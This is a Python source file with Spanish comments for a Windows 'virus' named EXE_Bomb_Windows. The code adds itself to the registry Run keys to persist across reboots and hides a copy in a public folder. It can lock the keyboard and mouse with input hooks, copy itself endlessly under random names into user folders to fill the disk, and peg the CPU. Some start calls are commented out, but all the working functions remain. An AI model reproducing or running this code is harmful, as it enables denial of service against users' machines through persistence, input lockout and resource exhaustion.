# v1.0
from pynput.mouse import Button, Controller  # Importa librería Mouse
import pythoncom, pyHook 
from winreg import *
import os 
from getpass import getuser 
from multiprocessing import Process
import threading
import shutil
import string

import random
          
def addStartup():  # function =  Iniciar automaticamente
    path = r"C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\EXE_Bomb_Windows.exe"        # Path del Software completo
    name = "EXE_Bomb_Windows"                                                       # Nombre del StartUp
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
    def verificar():    # Evita que se créen 2 veces el Bom
        try:  # Intenta crear la dirección
            os.makedirs('C:\\Users\\Public\\EXEBombWindows\\BoomRUN')
            return True # Se creó la carpeta
        except:
            return False# La carpeta ya existe
    try:    # Solo si tiene permisos de administrador
        registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
        SetValueEx(registry,name, 0, REG_SZ, path)
        verificar() # Crea Carpeta
    except: # Si no tien permisos de administrador
        if (verificar()):
            registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
            SetValueEx(registry,name, 0, REG_SZ, path)            
def Block():            # Lib [KeyandMouse_Block]
    mouse = Controller()  
    def BlockMouse():
        mouse.position = (0, 0) # el mouse se va a la posición 0,0 de la pantalla
        #mouse.press(Button.right)
        #mouse.release(Button.right)
        mouse.press(Button.left)
        mouse.release(Button.left)
        
    k = pyHook.HookManager()
    while(True):
        def e(event):
            return False
        BlockMouse()                # Bloquea el mouse
        k.KeyAll = e
        k.HookKeyboard()
        pythoncom.PumpMessages()    # Bloquea Teclado
def CreateFileMain():   # Crea carpeta que contiene el virus
        try:  # Intenta crear la dirección 
            os.makedirs('C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres')
            return True
        except:
            return False
        pass
def AutoCopy():         # Se replcia en el sistema, (Satura la Unidad:C)
    def random_char(y):
           return ''.join(random.choice(string.ascii_letters) for x in range(y))
    nameKey     = "EXE_Bomb_Windows" # Nombre del virus
    user        = str(getuser())
    path        = "C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\"+nameKey+".exe"   # Segunda iniciada, esto debe existir
    can  = 64    # Números de caracteres del nombre del virus
    documentos  = 'C:\\Users\\'+user+'\\Documents'
    music       = 'C:\\Users\\'+user+'\\Music'
    video       = 'C:\\Users\\'+user+'\\Videos'
    picture     = 'C:\\Users\\'+user+'\\Pictures'
    download    = 'C:\\Users\\'+user+'\\Downloads'
    roaming     = 'C:\\Users\\'+user+'\\AppData\\Roaming\\VirusBomb'
    locallow    = 'C:\\Users\\'+user+'\\AppData\\LocalLow\\VirusBomb'
    local       = 'C:\\Users\\'+user+'\\AppData\\Local\\VirusBomb'
    

    def CreateFolder():
        try:  # Intenta crear la dirección 
            os.makedirs(documentos)
        except:
            pass
        try:  # Intenta crear la dirección 
            os.makedirs(music)
        except:
            pass
        try:  # Intenta crear la dirección 
            os.makedirs(video)
        except:
            pass
        try:  # Intenta crear la dirección 
            os.makedirs(picture)
        except:
            pass
        try:  # Intenta crear la dirección 
            os.makedirs(download)
        except:
            pass
        try:  # Intenta crear la dirección 
            os.makedirs(roaming)
        except:
            pass
        try:  # Intenta crear la dirección 
            os.makedirs(locallow)
        except:
            pass
        try:  # Intenta crear la dirección 
            os.makedirs(local)
        except:
            pass
    def CopyDoc():
        try:
            shutil.copy(path, documentos+"\\"+random_char(can)+".exe")
        except:
            pass
    def CopyMus():
        try:
            shutil.copy(path, music+"\\"+random_char(can)+".exe")
        except:
            pass        
    def CopyVic():
        try:
            shutil.copy(path, video+"\\"+random_char(can)+".exe")
        except:
            pass   
    def CopyPic():
        try:
            shutil.copy(path, picture+"\\"+random_char(can)+".exe")
        except:
            pass        
    def CopyDow():
        try:
            shutil.copy(path, download +"\\"+random_char(can)+".exe")
        except:
            pass         
    def CopyRoa():
        try:
            shutil.copy(path, roaming+"\\"+random_char(can)+".exe")
        except:
            pass 
    def CopyLocL():
        try:
            shutil.copy(path, locallow +"\\"+random_char(can)+".exe")
        except:
            pass 
    def CopyLoc():
        try:
            shutil.copy(path, local+"\\"+random_char(can)+".exe")
        except:
            pass 
    
    #inicia Hilo
    CreateFolder() 
    while(True):
        CopyDoc()
        CopyMus()
        CopyVic()
        CopyPic()
        CopyDow()
        CopyRoa()
        CopyLocL()
        CopyLoc()

def CPU():
    def sature():
        n1 =  (random.randrange(98798498456498889)/random.randrange(15))
        n2 =  (random.randrange(98798498456498889)+random.randrange(64165143651651))
        n3 =  (random.randrange(98798498456498889)*random.randrange(999))
        n4 =  (random.randrange(98798498456498889)*random.randrange(453))
        n5 =  (random.randrange(98798498456498889)-random.randrange(453453453453453453))
        n6 =  (random.randrange(98798498456498889)*random.randrange(1435))
        n7 =  (random.randrange(98798498456498889)*random.randrange(4534))
        n8 =  (random.randrange(98798498456498889)-random.randrange(45345453453453453))
        n9 =  (random.randrange(98798498456498889)*random.randrange(154345))
        n10 = (random.randrange(98798498456498889)*random.randrange(4354345345345))
    while(True):
        try:
            while(True):
                sature()
        except:
            pass   
        
        
if __name__ == '__main__':
    if (CreateFileMain()):  # Se ejecuta en el primer inicio
        nameKey = "EXE_Bomb_Windows.exe"
        filePath = "C:\\Users\\Public\\EXEBombWindows\\Virus\\NoMeBorres\\"+ nameKey 
        try:     
            with open(filePath, 'r') as f:      # Verifica el virus se encuentra oculto en el sistema
                print("El virus existe")
        except : #Replica 
            print("No se encuentra en la carpeta, replicando...")
            try:
                shutil.copy(nameKey , filePath) # Intenta ocultar el virus en una carpeta
                print("Se replicó exitosamente")
            except:
                print("Replica fallida")
        # Autoinicia en registro
        addStartup()
        print("se creó la carpeta y startup exitoso, virus deshabilitado")
        exit()
    else:                   # Solo se ejecuta si la PC ya está infectada
        block = threading.Thread(target=Block)   # Bloquea Teclado y mouse



        #block.start()           # Bloquea teclado y mouse 
        while(True):
            autocopy = Process(target=AutoCopy)   # Copia y replica el virus en muchas carpetas del usuario
            cpuS = Process(target=CPU)
            #cpuS.start()
            #autocopy.start()        # Saturación del disco duro

